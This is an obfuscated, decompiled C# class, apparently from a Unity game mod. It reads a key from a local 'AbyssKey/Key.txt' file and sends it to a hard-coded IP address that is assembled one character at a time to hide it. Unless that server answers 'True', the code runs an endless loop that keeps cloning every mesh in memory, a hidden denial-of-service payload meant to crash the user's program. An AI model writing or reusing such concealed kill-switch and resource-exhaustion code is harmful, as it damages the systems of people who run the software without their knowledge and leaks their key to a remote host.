using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using UnityEngine;

namespace ns553
{
	// Token: 0x020003AF RID: 943
	public class GClass197
	{
		// Token: 0x06004A38 RID: 19000 RVA: 0x0011B2EC File Offset: 0x001194EC
		internal void method_0()
		{
			this.method_2();
		}

		// Token: 0x06004A39 RID: 19001 RVA: 0x0011B300 File Offset: 0x00119500
		internal void method_1()
		{
			this.method_0();
		}

		// Token: 0x06004A3A RID: 19002 RVA: 0x0011B314 File Offset: 0x00119514
		internal void method_2()
		{
			bool? flag = null;
			if (Directory.Exists(this.string_0))
			{
				flag = new bool?(false);
			}
			bool? flag2 = flag;
			if ((!flag2.GetValueOrDefault() & flag2 != null) && File.Exists(this.string_0 + "/" + "/" + this.string_1))
			{
				flag = new bool?(true);
			}
			flag2 = flag;
			if (flag2.GetValueOrDefault() & flag2 != null)
			{
				List<string> list = File.ReadAllLines(this.string_0 + "/" + "/" + this.string_1).OfType<string>().ToList<string>();
				if (list.Count > 0)
				{
					string text = list[0];
					if (text != string.Empty)
					{
						try
						{
							HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.Create(string.Concat(new string[]
							{
								"h",
								"t",
								"t",
								"p",
								":",
								"/",
								"/",
								"2",
								"3",
								"7",
								"1",
								"8",
								"4",
								"5",
								"3",
								"4",
								"8",
								":",
								"6",
								"2",
								"4",
								"3",
								"6",
								"/",
								"S",
								"h",
								"o",
								"u",
								"l",
								"d",
								"L",
								"o",
								"a",
								"d",
								"C",
								"l",
								"i",
								"e",
								"n",
								"t",
								"/",
								text
							})).GetResponse();
							bool flag3 = false;
							try
							{
								if (httpWebResponse.StatusCode == HttpStatusCode.OK)
								{
									StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
									try
									{
										if (streamReader.ReadToEnd() == "True")
										{
											flag3 = true;
										}
									}
									finally
									{
										streamReader.Close();
									}
								}
							}
							finally
							{
								httpWebResponse.Close();
							}
							if (flag3)
							{
								return;
							}
						}
						catch
						{
						}
					}
				}
			}
			for (int i = 0; i < 10; i++)
			{
				foreach (MeshFilter meshFilter in Resources.FindObjectsOfTypeAll<MeshFilter>())
				{
					if (meshFilter.mesh)
					{
						Object.Instantiate<Mesh>(meshFilter.mesh);
					}
				}
				i -= 2;
			}
		}

		// Token: 0x04001DAB RID: 7595
		private string string_0 = "AbyssKey";

		// Token: 0x04001DAC RID: 7596
		private string string_1 = "Key.txt";
	}
}
